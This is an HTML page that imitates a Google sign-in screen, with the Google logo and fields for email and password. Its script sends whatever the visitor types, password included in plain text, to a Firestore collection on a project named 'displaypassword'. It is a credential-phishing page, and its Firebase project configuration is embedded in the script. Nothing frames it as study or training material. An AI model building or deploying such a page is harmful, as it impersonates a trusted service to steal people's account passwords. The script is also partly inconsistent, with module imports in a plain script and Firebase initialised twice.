<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    /* Reset and styling */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background-color: #ffffff; color: #202124; }
    .container { width: 100%; max-width: 400px; padding: 24px; margin: 0 auto; text-align: center; }
    .logo { width: 92px; margin: 40px 0 24px; }
    h1 { font-size: 24px; font-weight: 400; margin: 0; }
    p { font-size: 14px; color: #5f6368; margin: 8px 0 24px; line-height: 1.5; }
    .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 8px; outline: none; }
    .left-align-links { text-align: left; margin-top: 4px; }
    .left-align-links a { color: #1a73e8; text-decoration: none; font-size: 14px; display: inline-block; }
    .left-align-links .create-link { margin-top: 80px; }
    .left-align-links a:hover { text-decoration: underline; }
    .button-container { display: flex; justify-content: flex-end; margin-top: 180px; }
    .button { width: 100px; padding: 10px; font-size: 14px; color: white; background-color: #1a73e8; border: none; border-radius: 4px; cursor: pointer; }
    .button:hover { background-color: #1665d8; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
    <h1>Welcome</h1>
    <p>Please enter your email to connect you with Mr. Robinson.</p>
    <input type="text" id="email-input" placeholder="Email" class="input-field">
    <input type="password" id="password-input" placeholder="Password" class="input-field">

    <div class="left-align-links">
      <a href="#" class="create-link">Create account</a>
    </div>
    
    <div class="button-container">
      <button class="button" onclick="saveInformation()">Next</button>
    </div>
  </div>

  <!-- Firebase and Firestore Scripts -->
  <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-firestore.js"></script>

  <script>
    // Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyB8KUTt6v6j2j4LAztW7Dv1Fmrzfr-cFgc",
  authDomain: "displaypassword.firebaseapp.com",
  projectId: "displaypassword",
  storageBucket: "displaypassword.firebasestorage.app",
  messagingSenderId: "609391145835",
  appId: "1:609391145835:web:bb1116bf321dee6909d22e",
  measurementId: "G-V907QZJ2XE"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Function to save email and password to Firestore
    function saveInformation() {
      const email = document.getElementById('email-input').value;
      const password = document.getElementById('password-input').value;

      if (email && password) {
        // Add the user's information to the "users" collection in Firestore
        db.collection("users").add({ email: email, password: password })
          .then(() => {
            alert("Information saved successfully!");
            // Redirect to another page after saving (modify this URL as needed)
            window.location.href = 'display.html';
          })
          .catch((error) => {
            console.error("Error saving information: ", error);
          });
      } else {
        alert("Please fill in both fields.");
      }
    }
  </script>
</body>
</html>
